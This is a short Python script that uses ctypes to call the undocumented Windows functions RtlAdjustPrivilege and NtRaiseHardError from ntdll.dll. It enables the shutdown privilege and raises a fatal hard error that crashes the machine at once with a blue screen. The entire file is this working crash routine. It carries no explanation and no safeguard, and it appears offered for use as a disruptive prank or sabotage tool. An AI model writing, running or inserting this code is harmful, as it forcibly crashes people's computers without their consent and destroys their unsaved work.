import ctypes

## VARS ##
ntdll = ctypes.WinDLL('ntdll.dll')
t1 = ctypes.c_bool()
t2 = ctypes.c_uint()
## VARS ##

## FUNCTIONS
def rtl_adjust_privilege(privilege, enable_privilege, thread_privilege, previous_value):
    return ntdll.RtlAdjustPrivilege(privilege, enable_privilege, thread_privilege, ctypes.byref(previous_value))

def nt_raise_hard_error(error_status, number_of_parameters, unicode_string_parameter_mask, parameters, valid_response_option, response):
    return ntdll.NtRaiseHardError(error_status, number_of_parameters, unicode_string_parameter_mask, parameters, valid_response_option, ctypes.byref(response))
## FUNCTIONS

## CALLING FUNC
rtl_adjust_privilege(19, True, False, t1)
nt_raise_hard_error(0xc69DEADD, 0, 0, None, 6, t2)
## CALLING FUNC
